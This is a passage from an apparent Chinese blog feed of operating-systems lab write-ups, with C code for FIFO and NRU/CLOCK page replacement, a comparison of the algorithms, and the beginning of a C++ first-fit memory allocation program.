class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//FIFO算法</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">FIFO</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span><br>&#123;<br><span class="hljs-comment">//检查请求访问的页是否在进程的内存中</span><br><span class="hljs-keyword">if</span> (flag[a] == <span class="hljs-literal">false</span>)<br>&#123;<br>miss[now_time] = <span class="hljs-number">1</span>; <span class="hljs-comment">//此次标记：缺页</span><br>miss_num++;<br><span class="hljs-keyword">if</span> (now_num == n) <span class="hljs-comment">//内存已满</span><br>&#123;<br><span class="hljs-type">int</span> min_time = <span class="hljs-number">0x3f3f3f</span>, min_num = <span class="hljs-number">-1</span>; <span class="hljs-comment">//被替换的页的入内存时间最早的页和位置</span><br><span class="hljs-comment">//在内存中的页中，先进先出（将入内存时间最早的页移出内存）</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; now_num; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (l_time[memory[i]] &lt; min_time)<br>&#123;<br>min_time = l_time[memory[i]];<br>min_num = i;<br>&#125;<br>&#125;<br>flag[a] = <span class="hljs-literal">true</span>;            <span class="hljs-comment">//将当前访问的页“是否在内存中”的标记设为1</span><br>flag[memory[min_num]] = <span class="hljs-number">0</span>; <span class="hljs-comment">//将被替换的页“是否在内存中”的标记设为0</span><br>memory[min_num] = a;       <span class="hljs-comment">//当前页替换最早入内存的页</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//内存未满</span><br>&#123;<br>flag[a] = <span class="hljs-literal">true</span>;<br>memory[now_num] = a; <span class="hljs-comment">//当前页进入内存的下一个位置</span><br>now_num++;           <span class="hljs-comment">//内存中页的个数加1</span><br>&#125;<br>l_time[a] = now_time; <span class="hljs-comment">//更新当前页的入内存时间为当前时间</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>miss[now_time] = <span class="hljs-number">0</span>; <span class="hljs-comment">//标记：未缺页</span><br>&#125;<br><span class="hljs-comment">//保存内存中页面的序列</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>state[now_time][i] = memory[i];<br>&#125;<br>now_time++; <span class="hljs-comment">//访问完一个页面，当前时间加1</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h4><p><img src="/2021/12/29/LRU_Algorithm/image-20211221084045884.png" alt="image-20211221084045884"></p><h3 id="NRU算法（CLOCK）"><a href="#NRU算法（CLOCK）" class="headerlink" title="NRU算法（CLOCK）"></a>NRU算法（CLOCK）</h3><p>简单的NRU算法是给每一帧关联一个附加位，称为使用位。当某一页首次装入主存时，该帧的使用位设置为1；当该页随后再被访问到时，它的使用位置为0。</p><p>对于页替换算法，用于替换的候选帧集合看做一个<strong>循环缓冲区</strong>，并且有一个指针与之相关联。当某一页被替换时，该指针被设置成指向缓冲区中的下一帧。当需要替换一页时，操作系统扫描缓冲区，以查找使用位被置为0的一帧。每当遇到一个使用位为1的帧时，操作系统就将该位重新置为0；如果在这个过程开始时，缓冲区中所有帧的使用位均为0，则选择遇到的第一个帧替换；如果所有帧的使用位均为1,则指针在缓冲区中完整地循环一周，把所有使用位都置为0，并且停留在最初的位置上，替换该帧中的页。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> u[<span class="hljs-number">1001</span>];         <span class="hljs-comment">//记录页面的使用位</span><br><span class="hljs-type">int</span> point;    <span class="hljs-comment">//指针</span><br></code></pre></div></td></tr></table></figure><p>算法实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//NRU算法</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">NRU</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span><br>&#123;<br><span class="hljs-comment">//检查请求访问的页是否在进程的内存中</span><br><span class="hljs-keyword">if</span> (flag[a] == <span class="hljs-literal">false</span>)<br>&#123;<br>miss[now_time] = <span class="hljs-number">1</span>; <span class="hljs-comment">//此次标记：缺页</span><br>miss_num++;<br><span class="hljs-type">int</span> num; <span class="hljs-comment">//被替换的页的位置</span><br><span class="hljs-keyword">if</span> (now_num == n) <span class="hljs-comment">//内存已满</span><br>&#123;<br><span class="hljs-comment">//指针遍历内存</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (u[memory[point]] == <span class="hljs-number">1</span>)<br>&#123;<br>u[memory[point]] = <span class="hljs-number">0</span>; <span class="hljs-comment">//将使用位为1的页面置为0</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//若使用位为0，被替换</span><br>&#123;<br>num = point;<br>flag[a] = <span class="hljs-literal">true</span>;        <span class="hljs-comment">//将当前访问的页“是否在内存中”的标记设为1</span><br>flag[memory[num]] = <span class="hljs-number">0</span>; <span class="hljs-comment">//将被替换的页“是否在内存中”的标记设为0</span><br>memory[num] = a;       <span class="hljs-comment">//当前页替换最久未使用过的页</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>point++;<br><span class="hljs-keyword">if</span> (point &gt;= n - <span class="hljs-number">1</span>)<br>&#123;<br>point %= (n - <span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//内存未满</span><br>&#123;<br>flag[a] = <span class="hljs-literal">true</span>;<br>memory[now_num] = a; <span class="hljs-comment">//当前页进入内存的下一个位置</span><br>u[now_num] = <span class="hljs-number">1</span>;     <span class="hljs-comment">//使用位：置为1</span><br>now_num++;           <span class="hljs-comment">//内存中页的个数加1</span><br>point = now_num;  <span class="hljs-comment">//指针指向下一位置</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>miss[now_time] = <span class="hljs-number">0</span>; <span class="hljs-comment">//标记：未缺页</span><br>u[now_num] = <span class="hljs-number">0</span>;<span class="hljs-comment">//使用位：置为0</span><br>&#125;<br><span class="hljs-comment">//保存内存中页面的序列</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>state[now_time][i] = memory[i];<br>&#125;<br>now_time++;           <span class="hljs-comment">//访问完一个页面，当前时间加1</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h4><p><img src="/2021/12/29/LRU_Algorithm/image-20211221092549071.png" alt="image-20211221092549071"></p><h3 id="最佳置换算法（OPT）（理想置换算法）"><a href="#最佳置换算法（OPT）（理想置换算法）" class="headerlink" title="最佳置换算法（OPT）（理想置换算法）"></a>最佳置换算法（OPT）（理想置换算法）</h3><p>无法预知一个进程中的若干页面哪一个最长时间不被访问，故无法实现。</p><h3 id="各算法优缺点"><a href="#各算法优缺点" class="headerlink" title="各算法优缺点"></a>各算法优缺点</h3><h4 id="最近最久未使用（LRU）"><a href="#最近最久未使用（LRU）" class="headerlink" title="最近最久未使用（LRU）"></a><strong>最近最久未使用（LRU）</strong></h4><p><strong>优点</strong>：由于考虑程序访问的时间局部性，一般能有较好的性能；实际应用多。<br><strong>缺点</strong>：实现需要较多的硬件支持，会增加硬件成本。</p><h4 id="先进先出（FIFO）"><a href="#先进先出（FIFO）" class="headerlink" title="先进先出（FIFO）"></a><strong>先进先出（FIFO）</strong></h4><p><strong>优点</strong>：先进先出算法实现简单，是最直观的一个算法。<br><strong>缺点</strong>：先进先出的性能最差，因为与通常页面的使用规则不符合，所以实际应用少。</p><h4 id="最近不用算法（NRU-CLOCK）"><a href="#最近不用算法（NRU-CLOCK）" class="headerlink" title="最近不用算法（NRU/CLOCK）"></a>最近不用算法（NRU/CLOCK）</h4><p><strong>优点</strong>：近似于LRU算法，考虑了时间局部性，一般性能比LRU好。<br><strong>缺点</strong>：同样需要较多的硬件支持，会增加硬件成本。</p><h4 id="最佳置换算法（OPT）（理想置换算法）-1"><a href="#最佳置换算法（OPT）（理想置换算法）-1" class="headerlink" title="最佳置换算法（OPT）（理想置换算法）"></a>最佳置换算法（OPT）（理想置换算法）</h4><p><strong>缺点</strong>：最佳置换算法是一种理想化算法，具有较好的性能，但是实际上无法实现（无法预知一个进程中的若干页面哪一个最长时间不被访问）；<br><strong>优点</strong>：最佳置换算法可以保证获得最低的缺页率</p>]]></content>
    
    
    <categories>
      
      <category>操作系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>主存储器空间的分配和回收的C++实现</title>
    <link href="/2021/12/29/Allocation_and_recycling_of_main_storage_space/"/>
    <url>/2021/12/29/Allocation_and_recycling_of_main_storage_space/</url>
    
    <content type="html"><![CDATA[<h1 id="实验七-2-主存储器空间的分配和回收"><a href="#实验七-2-主存储器空间的分配和回收" class="headerlink" title="实验七-2 主存储器空间的分配和回收"></a>实验七-2 主存储器空间的分配和回收</h1><h2 id="第一题-可变分区管理方式下的最先适应算法"><a href="#第一题-可变分区管理方式下的最先适应算法" class="headerlink" title="第一题 可变分区管理方式下的最先适应算法"></a>第一题 可变分区管理方式下的最先适应算法</h2><h3 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h3><p>在可变分区管理方式下采用最先适应算法实现主存分配和实现主存回收。</p><h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><p>(1) 可变分区方式是按作业需要的主存空间大小来分割分区的。当要装入一个作业时，根据作业需要的主存量查看是否有足够的空闲空间，若有，则按需要量分割一个分区分配给该作业；若无，则作业不能装入。随着作业的装入、撤离，主存空间被分成许多个分区，有的分区被作业占用，而有的分区是空闲的。例如：</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221093722261-16528034948721.png" alt="image-20211221093722261"></p><p>为了说明哪些区是空闲的，可以用来装入新作业，必须要有一张空闲区说明表，格式如下：</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221093759594-16528034988912.png" alt="image-20211221093759594"></p><p>（2）当有一个新作业要求装入主存时，必须查空闲区说明表，从中找出一个足够大的空闲区。有时找到的空闲区可能大于作业需要量，这时应把原来的空闲区变成两部分：一部分分给作业占用；另一部分又成为一个较小的空闲区。为了尽量减少由于分割造成的空闲区，而尽量保存高地址部分有较大的连续空闲区域，以利于大型作业的装入。为此，在空闲区说明表中，把每个空闲区按其地址顺序登记，即每个后继的空闲区其起始地址总是比前者大。为了方便查找还可使表格“紧缩”，总是让“空表目”栏集中在表格的后部。</p><p>（3）采用最先适应算法（顺序分配算法）分配主存空间。按照作业的需要量，查空闲区说明表，顺序查看登记栏，找到第一个能满足要求的空闲区。当空闲区大于需要量时，一部分用来装入作业，另一部分仍为空闲区登记在空闲区说明表中。</p><p>由于本实验是模拟主存的分配，所以把主存区分配给作业后并不实际启动装入程序装入作业，而用输出“分配情况”来代替。最先适应分配算法如图：</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221094635973-16528035024223.png" alt="image-20211221094635973"></p><p>（4）当一个作业执行结束撤离时，作业所占的区域应该归还，归还的区域如果与其它空闲区相邻，则应合成一个较大的空闲区，登记在空闲区说明表中。例如，在提示（1）中列举的情况下，如果作业2撤离，归还所占主存区域时，应与上、下相邻的空闲区一起合成一个大的空闲区登记在空闲区说明表中。归还主存时的回收算法如图：</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221094740232-16528035063594.png" alt="image-20211221094740232"></p><p>（5）请按最先适应算法设计主存分配和回收的程序。然后按（1）中假设主存中已装入三个作业，且形成两个空闲区，确定空闲区说明表的初值。现有一个需要主存量为6K的作业4申请装入主存；然后作业3撤离；再作业2撤离。请你为它们进行主存分配和回收，把空闲区说明表的初值以及每次分配或回收后的变化显示出来或打印出来。</p><h3 id="程序中使用的数据结构及符号说明"><a href="#程序中使用的数据结构及符号说明" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h3><ol><li>结构体及其数组（数据结构）：空闲区条目和作业条目</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> //空闲区条目和作业条目的结构体</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> len;   <span class="hljs-comment">//长度</span><br><span class="hljs-type">int</span> start; <span class="hljs-comment">//起址(闭)</span><br><span class="hljs-type">int</span> end;   <span class="hljs-comment">//终址(开)=起址+长度</span><br><span class="hljs-type">int</span> num;   <span class="hljs-comment">//编号（用于作业）</span><br>&#125;;<br>item Free[<span class="hljs-number">10010</span>]; <span class="hljs-comment">//空闲区条目</span><br>item work[<span class="hljs-number">10010</span>]; <span class="hljs-comment">//主存中作业的条目</span><br></code></pre></div></td></tr></table></figure><ol><li>整型变量</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> Freecnt = <span class="hljs-number">0</span>;  <span class="hljs-comment">//空闲区条目的数量</span><br><span class="hljs-type">int</span> workcnt;      <span class="hljs-comment">//主存中作业的数量</span><br><span class="hljs-type">int</span> max_len;      <span class="hljs-comment">//主存空间的最大长度</span><br><span class="hljs-type">int</span> os_len;       <span class="hljs-comment">//操作系统的长度</span><br></code></pre></div></td></tr></table></figure><ol><li>自定义函数<ul><li><code>bool cmp(item a, item b)</code>：将条目按起始地址排序</li><li><code>void display_work()</code>：输出作业表</li><li><code>display_Free()</code>：输出空闲表</li><li><code>void init()</code>：初始化主存</li><li><code>void alloc()</code>：分配新作业</li><li><code>void release()</code>：作业撤离，归还空间</li></ul></li></ol><h3 id="源程序并附上注释"><a href="#源程序并附上注释" class="headerlink" title="源程序并附上注释"></a>源程序并附上注释</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 可变分区管理最先适应算法</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> //空闲区条目和作业条目的结构体</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> len;   <span class="hljs-comment">//长度</span><br><span class="hljs-type">int</span> start; <span class="hljs-comment">//起址(闭)</span><br><span class="hljs-type">int</span> end;   <span class="hljs-comment">//终址(开)=起址+长度</span><br><span class="hljs-type">int</span> num;   <span class="hljs-comment">//编号（用于作业）</span><br>&#125;;<br>item Free[<span class="hljs-number">10010</span>]; <span class="hljs-comment">//空闲区条目</span><br>item work[<span class="hljs-number">10010</span>]; <span class="hljs-comment">//主存中作业的条目</span><br><span class="hljs-type">int</span> Freecnt = <span class="hljs-number">0</span>;  <span class="hljs-comment">//空闲区条目的数量</span><br><span class="hljs-type">int</span> workcnt;      <span class="hljs-comment">//主存中作业的数量</span><br><span class="hljs-type">int</span> max_len;      <span class="hljs-comment">//主存空间的最大长度</span><br><span class="hljs-type">int</span> os_len;       <span class="hljs-comment">//操作系统的长度</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">cmp</span><span class="hljs-params">(item a, item b)</span> <span class="hljs-comment">//将条目按起始地址排序</span><br>&#123;<br><span class="hljs-keyword">return</span> a.start &lt; b.start;<br>&#125;<br><br><span class="hljs-comment">//输出作业表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">display_work</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;作业表如下：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;---------------------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|序号|  作业  | 起址 | 长度 |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= workcnt; i++)<br>&#123;<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; i;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| 作业&quot;</span> &lt;&lt; left &lt;&lt; setw(<span class="hljs-number">3</span>) &lt;&lt; work[i].num;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; right &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; work[i].start &lt;&lt; <span class="hljs-string">&quot;k |&quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; right &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; work[i].len &lt;&lt; <span class="hljs-string">&quot;k |&quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;---------------------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">//输出空闲表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">display_Free</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;空闲表如下：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;------------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|序号| 起址 | 长度 |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= Freecnt; i++)<br>&#123;<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; i;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; right &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; Free[i].start &lt;&lt; <span class="hljs-string">&quot;k |&quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; right &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; Free[i].len &lt;&lt; <span class="hljs-string">&quot;k |&quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;------------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">//初始化主存</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入主存空间的长度（长度单位均为k）：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; max_len;<br><span class="hljs-comment">//构建主存中的操作系统空间</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入操作系统所占空间的长度：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; os_len;<br><span class="hljs-comment">//构建主存中的作业</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入主存中作业的条目：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; workcnt;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= workcnt; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;个作业的起始地址、长度：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; work[i].start &gt;&gt; work[i].len;<br>work[i].end = work[i].start + work[i].len;<br>work[i].num = i;<br><span class="hljs-keyword">if</span> (work[i].end &gt; max_len)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;超出了主存空间的最大长度，请重新输入&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>i--;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (work[i].start &lt; os_len)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;与操作系统空间部分重叠，请重新输入&quot;</span> &lt;&lt; <span 